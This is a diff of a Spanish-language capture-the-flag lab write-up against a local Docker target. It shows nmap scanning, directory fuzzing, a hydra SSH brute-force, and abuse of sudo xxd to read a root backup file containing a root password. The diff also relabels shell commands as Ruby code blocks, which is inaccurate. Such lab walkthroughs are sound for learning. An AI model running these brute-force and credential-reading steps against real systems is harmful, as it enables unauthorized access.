@@ -3,7 +3,7 @@
 
 Esacaneo de puertos y servicios 
 
-```bash
+```ruby
 nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-16 10:16 -03
@@ -33,7 +33,7 @@ Esto es lo que vemos al entrar al puerto 80
 
 Solicita credenciales para continuar, asi que aplico fuzzing web
 
-```bash
+```ruby
 feroxbuster -u 'http://172.17.0.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git -t 200 --random-agent --no-state -d 5
                                                                                                                                                                                                                                             
  ___  ___  __   __     __      __         __   ___
@@ -76,14 +76,14 @@ vemos unas credenciales con esto es mas que suficiente para login en la pagina p
 
 mas alla de un breve tutorial acerca de DevTools no hay mas nada de interes, pero si detallamos el script .js vemos una password antigua, pero al probarla con lo que podria ser el user chocolate via ssh no son credenciales validas, asi que aplico un ataque de fuerza bruta con hydra al servicio ssh
 
-```bash
+```ruby
 hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p baluleroh ssh://172.17.0.2
 ```
 <img width="1703" height="226" alt="image" src="https://github.com/user-attachments/assets/90d3434f-e72d-41c9-8c8c-c72833790600" />
 
 obtenemos credenciales para el servicio ssh
 
-```bash
+```ruby
 ssh carlos@172.17.0.2
 ```
 
@@ -98,7 +98,7 @@ No existen mas usuarios en el sistema, pero vemos que es posible ejecutar el bin
    <img width="978" height="130" alt="image" src="https://github.com/user-attachments/assets/df4b5a80-45e6-48c7-90a7-9e83973e7268" />
 y tambien observamos una nota que habla de un Backup en el directorio de root asi que podria leerlo con el binario xxd
 
-```bash
+```ruby
 sudo /usr/bin/xxd /root/data.bak
 
 00000000: 726f 6f74 3a62 616c 756c 6572 6974 6f0a  root:balulerito.
@@ -108,5 +108,5 @@ obtenemos credenciales para root asi que escalamos
 
 <img width="556" height="34" alt="image" src="https://github.com/user-attachments/assets/1c3dc843-0c7b-48dd-ad31-a6554fd110bf" />
 
-
+Ya con esto podremos ser usuario  root
 <img width="358" height="82" alt="image" src="https://github.com/user-attachments/assets/b3aefe7e-0224-4fd9-9ae2-ef69e9e77774" />
